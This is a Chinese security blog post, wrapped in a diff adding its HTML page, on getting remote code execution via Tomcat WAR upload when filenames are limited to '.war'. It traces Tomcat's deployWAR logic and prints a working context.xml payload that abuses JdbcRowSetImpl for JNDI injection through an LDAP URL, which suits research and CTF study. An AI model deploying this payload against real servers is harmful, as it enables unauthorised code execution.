@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="我想偷光日月潮汐和你慢慢的聊, 最好有张摇椅可以慢慢的摇慢慢的缩小 眼尾长出线条, 在漫漫的时光里一起变老 0x00 介绍之前在zsxq提了一个问题 https:&#x2F;&#x2F;t.zsxq.com&#x2F;0cU40i3uo，大概是 假设有一个环境，可以上传war包，但是文件名不能超过4个字符，怎么rce。 (默认tomcat环境) 于是在这里也简单的分享一下，虽然没有什么用。。。。 0x02 分析代码这里只是从t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat upload war bypass">
+<meta property="og:url" content="http://example.com/2023/03/21/Tomcat-upload-war-bypass/index.html">
+<meta property="og:site_name" content="一往无前虎山行">
+<meta property="og:description" content="我想偷光日月潮汐和你慢慢的聊, 最好有张摇椅可以慢慢的摇慢慢的缩小 眼尾长出线条, 在漫漫的时光里一起变老 0x00 介绍之前在zsxq提了一个问题 https:&#x2F;&#x2F;t.zsxq.com&#x2F;0cU40i3uo，大概是 假设有一个环境，可以上传war包，但是文件名不能超过4个字符，怎么rce。 (默认tomcat环境) 于是在这里也简单的分享一下，虽然没有什么用。。。。 0x02 分析代码这里只是从t">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agZ4J.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/ag2Zk.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agCNa.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agAeV.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agW9z.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agnkb.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agbaU.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/agIB3.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/ag4HN.png">
+<meta property="og:image" content="https://i.328888.xyz/2023/03/21/ag3A5.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/63966847/214033050-87bdd0f8-4982-4aac-b79d-a5b6d0f107b9.png">
+<meta property="article:published_time" content="2023-03-21T14:16:05.134Z">
+<meta property="article:modified_time" content="2023-03-21T14:42:27.096Z">
+<meta property="article:author" content="Firebasky">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="trick">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.328888.xyz/2023/03/21/agZ4J.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tomcat upload war bypass</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/03/11/zsxq-introduce/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/21/Tomcat-upload-war-bypass/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&text=Tomcat upload war bypass"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&is_video=false&description=Tomcat upload war bypass"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat upload war bypass&body=Check out this article: http://example.com/2023/03/21/Tomcat-upload-war-bypass/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&name=Tomcat upload war bypass&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&t=Tomcat upload war bypass"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">0x02 分析代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">后缀名大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">2.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-%E5%A4%B1%E8%B4%A5"><span class="toc-number">2.4.</span> <span class="toc-text">路径穿越 失败</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tomcat upload war bypass
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Firebasky</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-21T14:16:05.134Z" itemprop="datePublished">2023-03-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/java/" rel="tag">java</a>, <a class="tag-link-link" href="/tags/trick/" rel="tag">trick</a>
+    </div>
+
+
+	  
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>我想偷光日月潮汐和你慢慢的聊, 最好有张摇椅可以慢慢的摇<br>慢慢的缩小 眼尾长出线条, 在漫漫的时光里一起变老</p>
+<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>之前在zsxq提了一个问题 <a target="_blank" rel="noopener" href="https://t.zsxq.com/0cU40i3uo%EF%BC%8C%E5%A4%A7%E6%A6%82%E6%98%AF">https://t.zsxq.com/0cU40i3uo，大概是</a> 假设有一个环境，可以上传war包，但是文件名不能超过4个字符，怎么rce。 (默认tomcat环境)</p>
+<p>于是在这里也简单的分享一下，虽然没有什么用。。。。</p>
+<h2 id="0x02-分析代码"><a href="#0x02-分析代码" class="headerlink" title="0x02 分析代码"></a>0x02 分析代码</h2><p>这里只是从tomcat代码上研究bypass</p>
+<h3 id="后缀名大小写绕过"><a href="#后缀名大小写绕过" class="headerlink" title="后缀名大小写绕过"></a>后缀名大小写绕过</h3><p>上传的war支持大小写</p>
+<p><img src="https://i.328888.xyz/2023/03/21/agZ4J.png" alt="image-20230313105043961"></p>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>如果我们上传的war文件名不能超过4个怎么办？也就是只能上传 <strong>.war</strong></p>
+<p>这个问题会有什么影响？我本地测试了一下。在webapps下上传**.war**并没有成功生成文件夹和解压出我们的webshell。</p>
+<p>看看tomcat是什么代码逻辑</p>
+<p>org.apache.catalina.startup.HostConfig#deployWAR</p>
+<p>设置路径</p>
+<p><img src="https://i.328888.xyz/2023/03/21/ag2Zk.png" alt="image-20230313121202225"></p>
+<p><img src="https://i.328888.xyz/2023/03/21/agCNa.png" alt="image-20230313121020035"></p>
+<p>所以this.context.getPath() &#x3D;&#x3D; “” 上传的.war给ContextName处理</p>
+<p><img src="https://i.328888.xyz/2023/03/21/agAeV.png" alt="image-20230313115732787"></p>
+<p>因为获取不到pathname名（为**.**）就为ROOT</p>
+<p><img src="https://i.328888.xyz/2023/03/21/agW9z.png" alt="image-20230313120530915"></p>
+<p>然后在给war进行解压的时候，判断docBase存不存在，因为是ROOT文件，肯定存在就不会解压.war 流程结束</p>
+<p><img src="https://i.328888.xyz/2023/03/21/agnkb.png" alt="image-20230313120213186"></p>
+<p>所以：为什么上传 <strong>.war</strong>没有解压出我们的webshell。</p>
+<p><strong>是因为处理的路径为””,然后就用ROOT来判断存不存在，而ROOT默认是存在的所以不能解压.war</strong></p>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>知道了原因，那么我们怎么bypass。</p>
+<p>方法一：</p>
+<p>想办法删除ROOT文件夹。上传 <strong>.war</strong>，解压的文件就会重新在ROOT生成</p>
+<p>方法二：</p>
+<p>我们在看看org.apache.catalina.startup.HostConfig#deployWAR的逻辑</p>
+<p><img src="https://i.328888.xyz/2023/03/21/agbaU.png" alt="image-20230313121716099"></p>
+<p><img src="https://i.328888.xyz/2023/03/21/agIB3.png" alt="image-20230313121805002"></p>
+<p>在真正的部署war之前，判断了有没有META-INF&#x2F;context.xml文件之后解析。</p>
+<p>那么就简单了。我们上传 <strong>.war</strong>文件是META-INF&#x2F;context.xml</p>
+<p>内容是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context&gt;</span><br><span class="line">    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span><br><span class="line">    &lt;!-- web application will be reloaded.                                   --&gt;</span><br><span class="line">    &lt;WatchedResource&gt;web.xml&lt;/WatchedResource&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Manager className=&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">             dataSourceName=&quot;ldap://127.0.0.1:2333/TomcatBypass/Command/calc&quot;</span><br><span class="line">             autoCommit=&quot;true&quot;&gt;&lt;/Manager&gt;</span><br><span class="line">&lt;/Context&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传之后直接进行了jndi注入，并没有生成文件夹。成功利用！</p>
+<h3 id="路径穿越-失败"><a href="#路径穿越-失败" class="headerlink" title="路径穿越 失败"></a>路径穿越 失败</h3><p><strong>在调试的过程中想到，war不就是jar嘛而jar也是zip结构，那么就可能存在一个路径穿越的问题。</strong></p>
+<p>解压出war里面的文件发现可能是存在路径穿越</p>
+<p><img src="https://i.328888.xyz/2023/03/21/ag4HN.png" alt="image-20230313114819255"></p>
+<p>但是这里进行了判断，判断处理之后的文件路径是不是canonicalDocBasePath开头，不然就报错。</p>
+<p><img src="https://i.328888.xyz/2023/03/21/ag3A5.png" alt="image-20230313124038581"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>感觉这个trick没有什么用但是可以用去出CTF。（或者可能有人这样写防御）</p>
+<p>在分享一下自己的zsxq……（王婆卖瓜…..）</p>
+<p><img src="https://user-images.githubusercontent.com/63966847/214033050-87bdd0f8-4982-4aac-b79d-a5b6d0f107b9.png" alt="image-20230313124038581"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">0x02 分析代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">后缀名大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">2.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-%E5%A4%B1%E8%B4%A5"><span class="toc-number">2.4.</span> <span class="toc-text">路径穿越 失败</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/21/Tomcat-upload-war-bypass/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&text=Tomcat upload war bypass"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&is_video=false&description=Tomcat upload war bypass"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat upload war bypass&body=Check out this article: http://example.com/2023/03/21/Tomcat-upload-war-bypass/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&title=Tomcat upload war bypass"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&name=Tomcat upload war bypass&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/21/Tomcat-upload-war-bypass/&t=Tomcat upload war bypass"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Firebasky
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://erroratao.github.io/">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
